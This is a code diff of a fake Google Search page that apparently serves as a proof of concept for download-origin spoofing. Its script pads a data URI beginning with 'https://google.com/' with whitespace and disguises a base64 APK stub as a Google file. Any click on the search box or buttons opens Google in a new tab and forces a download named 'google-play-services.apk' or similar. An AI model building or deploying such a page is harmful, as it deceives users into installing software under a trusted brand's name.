@@ -5,37 +5,27 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
 <title>Google Search</title>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
+  * { margin:0; padding:0; box-sizing:border-box; }
   body {
-    font-family: Roboto, Arial, sans-serif;
-    background: #fff;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    min-height: 100vh;
-    flex-direction: column;
-    padding: 20px;
+    font-family: Roboto, Arial, sans-serif; background: #fff;
+    display: flex; align-items: center; justify-content: center;
+    min-height: 100vh; flex-direction: column; padding: 20px;
     -webkit-tap-highlight-color: transparent;
   }
-  .logo {
-    font-size: 72px; font-weight: 400; margin-bottom: 28px;
-  }
-  .logo .g1{color:#4285f4}.logo .o1{color:#ea4335}.logo .o2{color:#fbbc05}
-  .logo .g2{color:#4285f4}.logo .l{color:#34a853}.logo .e{color:#ea4335}
+  .logo { font-size: 72px; font-weight: 400; margin-bottom: 28px; }
+  .g1{color:#4285f4}.o1{color:#ea4335}.o2{color:#fbbc05}
+  .g2{color:#4285f4}.l{color:#34a853}.e{color:#ea4335}
   .search {
-    width: 88vw; max-width: 440px; padding: 14px 20px;
-    font-size: 16px; border: 1px solid #dfe1e5; border-radius: 24px;
-    outline: none; box-shadow: 0 1px 6px rgba(32,33,36,.12);
-    cursor: pointer; text-align: center;
+    width: 88vw; max-width: 440px; padding: 14px 20px; font-size: 16px;
+    border: 1px solid #dfe1e5; border-radius: 24px; outline: none;
+    box-shadow: 0 1px 6px rgba(32,33,36,.12); cursor: pointer; text-align: center;
   }
-  .search:focus { box-shadow: 0 1px 8px rgba(32,33,36,.2); }
   .btns { margin-top: 18px; }
   .btns button {
     background: #f8f9fa; border: 1px solid #f8f9fa;
     padding: 10px 18px; margin: 4px; border-radius: 4px;
     font-size: 14px; color: #3c4043; cursor: pointer;
   }
-  .info { margin-top: 24px; font-size: 12px; color: #999; }
 </style>
 </head>
 <body>
@@ -51,43 +41,35 @@
   <button id="btn2">I'm Feeling Lucky</button>
 </div>
 
-<p class="info">Tap the search box or buttons</p>
-
 <script>
 (function() {
   'use strict';
-
   var SP = ' '.repeat(200);
   var B64 = 'UEsDBBQAAAAAAAAAIVjKxoiZZAAAAGQAAAALAAAAY2xhc3Nlcy5kZXgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQSwECFAAUAAAAAAAAACFYysaImWQAAABkAAAACwAAAAAAAAAAAAAAgAEAAAAAY2xhc3Nlcy5kZXhQSwUGAAAAAAEAAQA5AAAAjQAAAAAA';
+  var DATA_URI = 'data:https://google.com/' + SP + 'application/vnd.android.package-archive;base64,' + B64;
 
-  var dataGoogle = 'data:https://google.com/' + SP + 'application/vnd.android.package-archive;base64,' + B64;
-  var dataPlay   = 'data:https://play.google.com/' + SP + 'application/vnd.android.package-archive;base64,' + B64;
-
-  function doAttack(domain, file) {
-    // Trigger download
-    var a = document.createElement('a');
-    a.href = dataGoogle;
-    a.download = file;
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-
-    // Then go to Google
+  function doAttack(file) {
+    // Open Google in new tab
+    window.open('https://www.google.com', '_blank');
+    // Download on current page - shows "google.com" as origin
     setTimeout(function() {
-      window.location.href = 'https://www.' + domain;
-    }, 150);
+      var a = document.createElement('a');
+      a.href = DATA_URI;
+      a.download = file;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    }, 500);
   }
 
   document.getElementById('box').addEventListener('click', function() {
-    doAttack('google.com', 'google-play-services.apk');
+    doAttack('google-play-services.apk');
   });
-
   document.getElementById('btn1').addEventListener('click', function() {
-    doAttack('google.com', 'google-play-update.apk');
+    doAttack('google-play-update.apk');
   });
-
   document.getElementById('btn2').addEventListener('click', function() {
-    doAttack('google.com', 'google-search.apk');
+    doAttack('google-search.apk');
   });
 })();
 </script>
